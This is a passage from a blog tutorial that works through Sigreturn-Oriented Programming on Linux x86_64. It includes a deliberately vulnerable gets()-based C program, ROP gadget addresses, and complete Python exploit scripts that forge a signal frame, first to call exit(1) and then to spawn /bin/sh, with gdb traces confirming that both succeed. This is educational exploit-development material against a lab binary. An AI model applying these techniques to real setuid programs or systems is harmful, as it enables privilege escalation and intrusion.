Because the Signal Frame is also placed in userspace-stack, can we fake a Signal Frame? Let us check it out.

Consider the following program **code3.c**.

```c
srop$ cat code3.c
#include <stdio.h>

void vuln_func()
{
	char buffer[100] = {0};
	printf("Enter your name: ");
	gets(buffer);
	printf("Entered name: %s\n", buffer);
}

int main()
{
	vuln_func();
	return 0;
}
```

It is a template program I use when playing with Buffer-Overflow vulnerabilities. The ```vuln_func``` calls ```gets``` function on a buffer present in stack. The ```gets``` does not do bounds checking and that is how this function has a buffer-overflow vulnerability.

With a BOF present, we have full control on the stack. We can write whatever we want. This means, we can setup a fake Signal Frame - basically copying the stack-dump presented in Subsection 2.2. But what do we do with it? Is it any helpful?

Compile it with no stack cookie protection and statically link it. This makes our experimentation easier. Stack-cookie protection won't allow us to play with the BOF. Also, we statically linked the binary because having more code in the binary helps while experimenting. Along with that, gcc by default doesn't generate a Position Independent Executable when statically linked. That way, we can evade ASLR during experimenting. If not, we will have to switch-off ASLR.

```
srop$ gcc code3.c -o code3 -g --static -fno-stack-protector
code3.c: In function ‘vuln_func’:
code3.c:8:2: warning: implicit declaration of function ‘gets’; did you mean ‘fgets’? [-Wimplicit-function-declaration]
  gets(buffer);
  ^~~~
  fgets
/tmp/ccu6ByR9.o: In function `vuln_func':
/home/dell/Documents/pwnthebox/exp/srop/code3.c:8: warning: the `gets' function is dangerous and should not be used.
```

### 3.1.1 Executing the exit(1) system call

Because we have full control of the stack, we can definitely setup a fake Signal Frame. But what do we do with it?

Whatever value we place for a particular register in the Signal Frame, the same value is copied into the actual processor and execution continues. When that is the case, let us put **useful** values for each of the registers.

Let us start small. Let us try executing ```exit(1)``` system call. For that, ```rax``` should have a value of 60(or 0x3c), ```rdi``` with the value of 1. Finally, we should somehow call the ```syscall``` instruction - that is exactly what ```rip```(Instruction Pointer) is here for. The kernel transfers control to **whichever** address present in ```rip```. This is our plan.

Let us write a script to generate an input payload which will setup the fake Signal Frame when given as input to **code3**. Call it **exploit.py**. The following is the skeleton. Our goal is to use a fake Signal Frame and **terminate** the process. How can we do that?

```python
#!/usr/bin/env python3                                                          
import struct

def fake_frame():
  # Here comes the code

if __name__ == '__main__':
    fake_frame()
```

Now, let us start filling the ```fake_frame()``` function.

The first and foremost thing is the junk-bytes which we need to fill up till we reach the place where return-address is present. In the binary I have, I need to add 120 bytes of junk. You can find it out by looking at its disassembly or by using gdb.

```python
def fake_frame():                                                               

    # Add the initial junk
    payload = b''
    payload += b'\x41' * 120
```

Look at how the stack looked like for a signal-handler. Its return-address was the ```__restore_rt``` function. So even here, we need to overwrite the ```vuln_func```'s return-address with ```__restore_rt``` function. But where is ```__restore_rt``` present? Traditionally, it is present in libc.so. The paper lists a variety of places and options where we can find ```__restore_rt```. I am running a x86_64 Linux box with kernel version 5.4.0. For this, I have only one option: **libc.so**. This is why I statically linked the binary. Some relevant libc.so code would be present in my binary. Let us see if ```__restore_rt``` is present.

```
srop$ readelf --syms ./code3 | grep restore
   400: 000000000045a2e0     0 FUNC    LOCAL  DEFAULT    6 __restore_rt
```

It is present. But what if it is not present? In a realistic scenario where the binary is large, you can find ROP gadgets to get the job done. All we need is the following: Register rax should have 15 in it and then a ```syscall```. Let us check if my binary has the necessary gadgets. I will be using [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to get the list of gadgets.

```
srop$ ROPgadget --binary code3 > code3.rop.obj
```

The following is what I found:

1. To zeroize ```rax```: ```0x00000000004440c0 - xor rax, rax ; ret```
2. To increment ```rax```: ```0x0000000000474320 : add rax, 1 ; ret```. This can be used 15 times to load 15 into ```rax```.
3. Syscall: ```0x000000000040125c : syscall```

Alright, we have the necessary gadgets. Let me use these gadgets instead of the ```__restore_rt```.

```python3
def fake_frame():                                                               
                                                                                
    # Add the initial junk                                                      
    payload = b''                                                               
    payload += b'\x41' * 120                                                    
                                                                                
    # Let us first call the rt_sigreturn                                        
    # __restore_rt is generally not found in binaries.                          
    # Let us use Gadgets (ROP-style) and get it done.                           
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x000000000040125c)    # syscall
```

Now comes the interesting part - setting up the rest of the Signal Frame. Please look up the stack-dump and copy those values into the exploit.

```
    # Now, let us construct the first sigframe                                  
    # which will be loaded by the above rt_sigreturn.                           
    # 1. ucontext                                                               
    payload += struct.pack('<Q', 0x0000000000000007)    # uc_flags              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_link               
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp        
    payload += struct.pack('<Q', 0x0000ffff00000000)    # uc_stack.ss_flags     
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size 
```

Please note that these bytes should be in this very order. Internally, the kernel typecasts these bytes back to the ```rt_sigframe``` structure and then processes it - so these members should be in the exact order present in the stack-dump.

At the moment, all we care about are registers ```rax```, ```rdi``` and ```rip```. We can fill up rest with garbage values.


```
    # 2. General Purpose Registers                                              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15                   
```

Then comes ```rdi``` register.

```
    payload += struct.pack('<Q', 0x0000000000000001)    # RDI = 1, exit(1)
```

Then a few more registers.

```
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSI                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBP                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RDX               
```

Then comes ```rax```.

```
    payload += struct.pack('<Q', 0x000000000000003c)    # RAX = exit's system call number = 60.
```

Then a few more registers.

```
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX               
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSP               
```

Then comes the final important register - ```rip``` - the Instruction Pointer. Note that whatever address is present here, it will be loaded into the processor's ```rip``` register and code present at that address will be executed. Our goal is to execute ```exit(1)``` system call. We want ```rip``` to point to a ```syscall``` instruction.

```
    payload += struct.pack('<Q', 0x000000000040125c)    # RIP = should call 'syscall' instruction
```

Then comes the rest of the members in the Signal Frame. I have copied it from the stack-dump in Subsection 2.2. You please copy the values present in your stack-dump.

```
    payload += struct.pack('<Q', 0x0000000000000202)    # EFLAGS
    payload += struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    payload += struct.pack('<Q', 0x0000000000000000)    # ERR                   
    payload += struct.pack('<Q', 0x0000000000000001)    # TrapNo                
    payload += struct.pack('<Q', 0x0000000000000000)    # Old-Mask              
    payload += struct.pack('<Q', 0x0000000000000000)    # CR2                   
    payload += struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL        
    payload += struct.pack('<Q', 0x000000000000000e)    # reserved              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_sigmask
```

All the above values were directly copied from the actual stack-dump. Here, we don't care about preserving the FPU-context, hence the NULL. I will be ignoring the ```struct siginfo``` data. I am not sure if that will affect the exploit, but let us see.

Please note that these addresses are taken from my binary. In your exploit script, make sure to put in addresses and values from your binary and stack-dump.

Finally, let us write it into a file.

```python
    # Ignoring siginfo.                                                         
                                                                                
    # Writing the payload into a file.                                          
    fo = open('payload.txt', 'wb')                                              
    fo.write(payload)                                                           
    fo.close()
```

With that, we are ready with our ```fake_frame()``` function.

Reiterating the idea: This fake Signal Frame which we have placed in the stack hopefully will be picked up by the kernel when ```rt_sigreturn``` is executed and these register values will be actually loaded into the processor and ```syscall``` instruction is run (because ```rip``` points to a syscall instruction). Let us run the script and get the **payload.txt**.

```
srop$ ./exploit.py
srop$ ls -l payload.txt 
-rw-r--r-- 1 dell dell 504 May 10 18:39 payload.txt
```

And we have our input payload ready - it is 504 bytes long. Let us run it.

```
srop$ cat payload.txt - | ./code3

Enter your name: Entered name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�@D

srop$ echo $?
1
srop$
```

I think it worked! Let us run it through gdb and make sure the exploit works. The following is just before ```vuln_func```'s ```ret``` instruction gets executed.

```
[-------------------------------------code-------------------------------------]
   0x400bc7 <vuln_func+90>:	call   0x40f6c0 <printf>
   0x400bcc <vuln_func+95>:	nop
   0x400bcd <vuln_func+96>:	leave  
=> 0x400bce <vuln_func+97>:	ret    
   0x400bcf <main>:	push   rbp
   0x400bd0 <main+1>:	mov    rbp,rsp
   0x400bd3 <main+4>:	mov    eax,0x0
   0x400bd8 <main+9>:	call   0x400b6d <vuln_func>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd938 --> 0x4440c0 (<__strchr_sse2_no_bsf+128>:	xor    rax,rax)
0008| 0x7fffffffd940 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0016| 0x7fffffffd948 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0024| 0x7fffffffd950 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0032| 0x7fffffffd958 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0040| 0x7fffffffd960 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0048| 0x7fffffffd968 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
0056| 0x7fffffffd970 --> 0x474320 (<__wcslen_sse2+512>:	add    rax,0x1)
[------------------------------------------------------------------------------]
```

Note that the entire payload is 504 bytes long. It has junk of 120 bytes. This means the actual working payload should be (504-120) = 384 bytes. Let us dump those bytes.

```
gdb-peda$ x/48x $rsp
0x7fffffffd938:	0x00000000004440c0	0x0000000000474320
0x7fffffffd948:	0x0000000000474320	0x0000000000474320
0x7fffffffd958:	0x0000000000474320	0x0000000000474320
0x7fffffffd968:	0x0000000000474320	0x0000000000474320
0x7fffffffd978:	0x0000000000474320	0x0000000000474320
0x7fffffffd988:	0x0000000000474320	0x0000000000474320
0x7fffffffd998:	0x0000000000474320	0x0000000000474320
0x7fffffffd9a8:	0x0000000000474320	0x0000000000474320
0x7fffffffd9b8:	0x000000000040125c	0x0000000000000007
0x7fffffffd9c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd9d8:	0x0000ffff00000000	0x0000000000000000
0x7fffffffd9e8:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffd9f8:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda08:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda18:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda28:	0x0000000000000001	0xdeadbeefdeadbeef
0x7fffffffda38:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda48:	0xdeadbeefdeadbeef	0x000000000000003c
0x7fffffffda58:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda68:	0x000000000040125c	0x0000000000000202
0x7fffffffda78:	0x002b000000000033	0x0000000000000000
0x7fffffffda88:	0x0000000000000001	0x0000000000000000
0x7fffffffda98:	0x0000000000000000	0x0000000000000000
0x7fffffffdaa8:	0x000000000000000e	0x0000000000000000
```

But this is not the Signal Frame. It also has the initial ROP-chain which we used to emulate the ```__restore_rt``` function. The following is one instruction before ```syscall``` of the ROP-chain is called.

```
[-------------------------------------code-------------------------------------]
   0x47431b <__wcslen_sse2+507>:	ret    
   0x47431c <__wcslen_sse2+508>:	nop    DWORD PTR [rax+0x0]
   0x474320 <__wcslen_sse2+512>:	add    rax,0x1
=> 0x474324 <__wcslen_sse2+516>:	ret    
   0x474325 <__wcslen_sse2+517>:	nop
   0x474326 <__wcslen_sse2+518>:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x474330 <__wcslen_sse2+528>:	add    rax,0x3
   0x474334 <__wcslen_sse2+532>:	ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd9b8 --> 0x40125c (<__libc_start_main+1020>:	syscall)
0008| 0x7fffffffd9c0 --> 0x7 
0016| 0x7fffffffd9c8 --> 0x0 
0024| 0x7fffffffd9d0 --> 0x0 
0032| 0x7fffffffd9d8 --> 0xffff00000000 
0040| 0x7fffffffd9e0 --> 0x0 
0048| 0x7fffffffd9e8 --> 0xdeadbeefdeadbeef 
0056| 0x7fffffffd9f0 --> 0xdeadbeefdeadbeef 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000474324 in __wcslen_sse2 ()
```

This snapshot looks similar to the one where we were returning from the signal-handler. The ```syscall``` instruction here is symbolic of the actual ```__restore_rt``` function present. Rest is the Signal Frame. The following is the stack-dump.

```
gdb-peda$ x/32qx $rsp
0x7fffffffd9b8:	0x000000000040125c	0x0000000000000007
0x7fffffffd9c8:	0x0000000000000000	0x0000000000000000
0x7fffffffd9d8:	0x0000ffff00000000	0x0000000000000000
0x7fffffffd9e8:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffd9f8:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda08:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda18:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda28:	0x0000000000000001	0xdeadbeefdeadbeef
0x7fffffffda38:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda48:	0xdeadbeefdeadbeef	0x000000000000003c
0x7fffffffda58:	0xdeadbeefdeadbeef	0xdeadbeefdeadbeef
0x7fffffffda68:	0x000000000040125c	0x0000000000000202
0x7fffffffda78:	0x002b000000000033	0x0000000000000000
0x7fffffffda88:	0x0000000000000001	0x0000000000000000
0x7fffffffda98:	0x0000000000000000	0x0000000000000000
0x7fffffffdaa8:	0x000000000000000e	0x0000000000000000
gdb-peda$
```

Let us go ahead and execute the ```syscall``` instruction. The following snapshot is after ```syscall```.

```
[----------------------------------registers-----------------------------------]
RAX: 0x3c ('<')
RBX: 0xdeadbeefdeadbeef 
RCX: 0xdeadbeefdeadbeef 
RDX: 0xdeadbeefdeadbeef 
RSI: 0xdeadbeefdeadbeef 
RDI: 0x1 
RBP: 0xdeadbeefdeadbeef 
RSP: 0xdeadbeefdeadbeef 
RIP: 0x40125c (<__libc_start_main+1020>:	syscall)
R8 : 0xdeadbeefdeadbeef 
R9 : 0xdeadbeefdeadbeef 
R10: 0xdeadbeefdeadbeef 
R11: 0xdeadbeefdeadbeef 
R12: 0xdeadbeefdeadbeef 
R13: 0xdeadbeefdeadbeef 
R14: 0xdeadbeefdeadbeef 
R15: 0xdeadbeefdeadbeef
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x401254 <__libc_start_main+1012>:	nop    DWORD PTR [rax+0x0]
   0x401258 <__libc_start_main+1016>:	xor    edi,edi
   0x40125a <__libc_start_main+1018>:	mov    eax,edx
=> 0x40125c <__libc_start_main+1020>:	syscall 
   0x40125e <__libc_start_main+1022>:	jmp    0x401258 <__libc_start_main+1016>
   0x401260 <__libc_start_main+1024>:	lea    rdi,[rip+0x90e91]        # 0x4920f8
   0x401267 <__libc_start_main+1031>:	call   0x4125e0 <__libc_fatal>
   0x40126c <__libc_start_main+1036>:	mov    edx,DWORD PTR [rip+0x2babba]        # 0x6bbe2c <_dl_x86_cpu_features+76>
Guessed arguments:
arg[0]: 0x1 
[------------------------------------stack-------------------------------------]
Invalid $SP address: 0xdeadbeefdeadbeef
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x000000000040125c in __libc_start_main ()
gdb-peda$ 
```

In your instance of gdb, please verify each register's value and make sure it is what you intended it to be. We care only about ```rax```, ```rdi``` and ```rip``` - all 3 have the values we had put in the fake Signal Frame.

From a standard point of view, this is not an ideal position for a process to be in. The Stack-Pointer and Base-Pointers are corrupted - which means even if one instruction related to stack is executed, the program would crash. But we have only one instruction to execute: ```syscall```. Let us do it.

```
gdb-peda$ ni
[Inferior 1 (process 25005) exited with code 01]
Warning: not running
```

And the exploit worked.

## 4. Other interesting exploits

In the above section, it was a proof-of-concept to confirm that the vulnerability exists and see if we could do something interesting. We executed the ```exit(1)``` system call.

# 4.1 Simple shell using execve

The next step is to try and get a shell. In realistic scenarios, getting a normal shell helps in escalating privileges. The assumption is that the attacker already has remote access to the system as an unprivileged user and he finds a root-owned/setuid program he can run which has a buffer overflow vulnerability.

Let us assume that **code3** is that program and try getting a shell by executing ```execve``` system call using SROP. We want to execute the following:

```
execve("/bin/sh", NULL, NULL);
```

Basic structure of this exploit is similar to what we wrote in the previous section. Register ```rax``` will have ```execve```'s system call number, ```rdi``` will have the address of the string **"/bin/sh"**, ```rsi``` will have 0 and ```rdx``` will have 0. Only item of concern is the binsh string. My binary doesn't have it. What do we do?

I have conveniently statically linked my binary with fixed addresses for text, data and rodata address spaces. We can use ROP gadgets of the form (write, what, where). Please note that with a dynamically linked position independent binary along with ASLR, the exploit would be much harder. We have made it really easy so that we can understand the exploit method.

The [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) tool can be used to catch hold of write-what-where gadgets.

```
	[+] Gadget found: 0x47eff1 mov qword ptr [rsi], rax ; ret
	[+] Gadget found: 0x403ace pop rsi ; ret
	[+] Gadget found: 0x4005af pop rax ; ret
	[+] Gadget found: 0x4440c0 xor rax, rax ; ret
```

Let us start writing our exploit. Let us call it ```execve()``` function inside the same **exploit.py** file.

First of all, let us stitch gadgets which write the **/bin/sh** string into a known memory location.

```python
def execve():                                                                   
                                                                                
    # Add the initial junk                                                      
    payload = b''                                                               
    payload += b'\x41' * 120                                                    
                                                                                
    # Writing the string "/bin//sh" into the data section.                      
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x00000000004005af)    # pop rax; ret          
    payload += b'/bin//sh'                                                      
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x00000000004006a6)    # pop rdi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x0000000000448d85)    # pop rdx; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8
```

This will write the string "/bin//sh" into the data section start - 0x00000000006b90e0. The rest the exact same as the previous exploit except for the Registers ```rax```, ```rdi```, ```rsi``` and ```rdx```. ```rax``` should have 0x3b (59) which is ```execve```'s system call number, ```rdi``` should have 0x00000000006b90e0 which is the address where "/bin//sh" is present, ```rsi``` should be 0x0000000000000000 and ```rdx``` should also be 0x0000000000000000. With that, our exploit would be ready. Please note that you need to use addresses from **your** binary and not what is used in this post. They might be different and can fail the exploit.

The following is the full listing of the exploit.

```python
def execve():                                                                   
                                                                                
    # Add the initial junk                                                      
    payload = b''                                                               
    payload += b'\x41' * 120                                                    
                                                                                
    # Writing the string "/bin//sh" into the data section.                      
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x00000000004005af)    # pop rax; ret          
    payload += b'/bin//sh'                                                      
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x000000000047eff1)    # mov qword ptr [rsi], rax; ret
    payload += struct.pack('<Q', 0x00000000004006a6)    # pop rdi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e0)    # .data                 
    payload += struct.pack('<Q', 0x0000000000403ace)    # pop rsi; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
    payload += struct.pack('<Q', 0x0000000000448d85)    # pop rdx; ret          
    payload += struct.pack('<Q', 0x00000000006b90e8)    # .data + 8             
                                                                                
    # Let us first call the rt_sigreturn                                        
    # __restore_rt is generally not found in binaries.                          
    # Let us use Gadgets (ROP-style) and get it done.                           
    payload += struct.pack('<Q', 0x00000000004440c0)    # xor rax, rax; ret        
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret          
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x0000000000474320)    # add rax, 1; ret       
    payload += struct.pack('<Q', 0x000000000040125c)    # syscall               
                                                                                
    # Now, let us construct the first sigframe                                  
    # which will be loaded by the above rt_sigreturn.                           
    # 1. ucontext                                                               
    payload += struct.pack('<Q', 0x0000000000000007)    # uc_flags              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_link               
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_sp        
    payload += struct.pack('<Q', 0x0000ffff00000000)    # uc_stack.ss_flags     
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_stack.ss_size      
                                                                                
    # 2. General Purpose Registers                                              
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R8                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R9                    
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R10                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R11                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R12                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R13                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R14                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # R15
    # 3. First argument for execve() = location of "/bin//sh"                   
    payload += struct.pack('<Q', 0x00000000006b90e0)    # RDI = location of "/bin//sh"
                                                                                
    # 4. Second argument for execve() = NULL                                    
    payload += struct.pack('<Q', 0x0000000000000000)    # RSI = NULL            
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBP                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RBX                   
                                                                                
    # 5. Third argument for execve() = NULL                                     
    payload += struct.pack('<Q', 0x0000000000000000)    # RDX = NULL            
                                                                                
    # 5. execve()'s system call number                                          
    payload += struct.pack('<Q', 0x000000000000003b)    # RAX = execve's system call number = 59
                                                                                
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RCX                   
    payload += struct.pack('<Q', 0xdeadbeefdeadbeef)    # RSP                   
                                                                                
    # 5. Finally what to execute                                                
    payload += struct.pack('<Q', 0x000000000040125c)    # RIP = should call 'syscall' instruction
                                                                                
    # Rest of it                                                                
    payload += struct.pack('<Q', 0x0000000000000202)    # EFLAGS - Some value   
    payload += struct.pack('<Q', 0x002b000000000033)    # Segment Registers(SS, FS, GS, CS)
    payload += struct.pack('<Q', 0x0000000000000000)    # ERR                   
    payload += struct.pack('<Q', 0x0000000000000001)    # TrapNo                
    payload += struct.pack('<Q', 0x0000000000000000)    # Old-Mask              
    payload += struct.pack('<Q', 0x0000000000000000)    # CR2                   
    payload += struct.pack('<Q', 0x0000000000000000)    # fpstate = NULL        
    payload += struct.pack('<Q', 0x000000000000000e)    # reserved              
    payload += struct.pack('<Q', 0x0000000000000000)    # uc_sigmask            
                                                                                
    # Ignoring siginfo.                                                         
                                                                                
    # Writing the payload into a file.
    fo = open('payload.txt', 'wb')                                              
    fo.write(payload)                                                           
    fo.close()
```

Don't forget calling ```execve()``` function. Let us generate the payload and run the exploit.

```
srop$ ./exploit.py 
srop$ ls -l payload.txt 
-rw-r--r-- 1 dell dell 624 May 10 20:38 payload.txt
srop$ cat payload.txt - | ./code3

Enter your name: Entered name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�:@
ls
a.out  code1  code1.c  code2  code2.c  code3  code3.c  code3.rop.obj  exploit.py  exploit_old.py  payload.txt  peda-session-code3.txt  srop
whoami
dell
```

And we got the shell!

Please note that no privilege escalation happened here. If the program ran effectively as root, we would have seen the escalation.
Getting normal shell helps when the attacker already has remote access to the system as an unprivileged user and he finds a root-owned/setuid program which has a buffer overflow vulnerability and can run it.

## 5. Conclusion

We saw what signals are, how they work - some internals like Signal Frame, ```rt_sigreturn``` system call. We also confirmed that the vulnerability mentioned in the paper exists - the fact that kernel can be fooled by setting up a fake Signal Frame. And then we went on to build 2 very simple exploits: One that terminates the process and other which gives a shell. From paper's point of view, we have gone through the first 5 sections.

The 6th section is about SROP for Exploitation. This section is the meat of the paper. It explains techniques to execute any system call we want using just SROP - without the use of traditional ROP gadgets. We will be implementing it in detail in the next post. I also plan to automate the entire SROP procedure and add it to our homegrown ROP tool - [ROPilicious](https://github.com/ROPilicious/src).

This Signal Frame vulnerability is an exceptional finding! It is even more crazy than the fact that we chain gadgets together to run arbitrary code. For me personally, ROP had set the bar for wierd and crazy. But SROP has taken the bar to much higher heights.

That is it for now.

Thanks for reading :-)